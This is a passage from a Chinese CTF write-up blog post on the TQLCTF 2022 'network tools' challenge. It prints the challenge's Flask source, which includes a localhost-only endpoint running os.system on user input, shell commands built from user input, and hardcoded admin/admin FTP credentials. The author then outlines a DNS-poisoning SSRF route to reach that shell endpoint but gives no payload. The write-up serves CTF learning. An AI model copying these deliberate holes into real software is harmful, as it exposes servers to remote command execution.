class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, send_from_directory,session<br><span class="hljs-keyword">from</span> flask_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ftplib<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">32</span>)<br>app.config[<span class="hljs-string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="hljs-string">&#x27;filesystem&#x27;</span>  <br>sess = Session()<br>sess.init_app(app)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec_command</span>(<span class="hljs-params">cmd, addr</span>):<br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^[a-zA-Z0-9.:-]+$&#x27;</span>, addr) != <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">with</span> os.popen(cmd % (addr)) <span class="hljs-keyword">as</span> readObj:<br>            result = readObj.read()<br>    <span class="hljs-keyword">else</span>:<br>        result = <span class="hljs-string">&#x27;Invalid Address!&#x27;</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;token&#x27;</span>):<br>        token = md5(os.urandom(<span class="hljs-number">32</span>)).hexdigest()[:<span class="hljs-number">8</span>]<br>        session[<span class="hljs-string">&#x27;token&#x27;</span>] = token<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ping&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>():<br>    addr = request.form.get(<span class="hljs-string">&#x27;addr&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> addr == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Parameter &quot;addr&quot; Empty!&#x27;</span><br>    <span class="hljs-keyword">return</span> exec_command(<span class="hljs-string">&quot;ping -c 3 -W 1 %s 2&gt;&amp;1&quot;</span>, addr)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/traceroute&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">traceroute</span>():<br>    addr = request.form.get(<span class="hljs-string">&#x27;addr&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> addr == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Parameter &quot;addr&quot; Empty!&#x27;</span><br>    <span class="hljs-keyword">return</span> exec_command(<span class="hljs-string">&quot;traceroute -q 1 -w 1 -n %s 2&gt;&amp;1&quot;</span>, addr)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/ftpcheck&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ftpcheck</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;token&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    domain = session.get(<span class="hljs-string">&#x27;token&#x27;</span>) + <span class="hljs-string">&quot;.ftp.testsweb.xyz&quot;</span><br>    file = <span class="hljs-string">&#x27;robots.txt&#x27;</span><br>    fp = BytesIO()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> ftplib.FTP(domain) <span class="hljs-keyword">as</span> ftp:<br>            ftp.login(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>)<br>            ftp.retrbinary(<span class="hljs-string">&#x27;RETR &#x27;</span> + file, fp.write)<br>    <span class="hljs-keyword">except</span> ftplib.all_errors <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;FTP &#123;&#125; Check Error: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(domain,<span class="hljs-built_in">str</span>(e))<br>    fp.seek(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> ftplib.FTP(domain) <span class="hljs-keyword">as</span> ftp:<br>            ftp.login(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>)<br>            ftp.storbinary(<span class="hljs-string">&#x27;STOR &#x27;</span> + file, fp)<br>    <span class="hljs-keyword">except</span> ftplib.all_errors <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;FTP &#123;&#125; Check Error: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(domain,<span class="hljs-built_in">str</span>(e))<br>    fp.close()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;FTP &#123;&#125; Check Success.&#x27;</span>.<span class="hljs-built_in">format</span>(domain)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/shellcheck&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shellcheck</span>():<br>    <span class="hljs-keyword">if</span> request.remote_addr != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Localhost only&#x27;</span><br>    shell = request.form.get(<span class="hljs-string">&#x27;shell&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> shell == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Parameter &quot;shell&quot; Empty!&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(os.system(shell))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure>

<p>思路就出来了</p>
<p>利用</p>
<p>@app.route(“&#x2F;shellcheck”, methods&#x3D;[‘POST’])</p>
<p>@app.route(“&#x2F;ftpcheck”)</p>
<p>这两个路由，通过DNS污染，完成SSRF提权，执行shell</p>
<p>但是我SSRF不会</p>
<p>离谱。学习一下</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/18/ctfshow-ssrf/">← Next ctfshow_ssrf</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/15/LitCTF-2023/">LitCTF-2023 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr0se</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TQLCTF-2022-simple-bypass"><span class="toc-number">2.</span> <span class="toc-text">[TQLCTF 2022]simple_bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TQLCTF-2022-SQL-TEST"><span class="toc-number">3.</span> <span class="toc-text">[TQLCTF 2022]SQL TEST</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TQLCTF-2022-network-tools"><span class="toc-number">4.</span> <span class="toc-text">[TQLCTF 2022]network tools</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>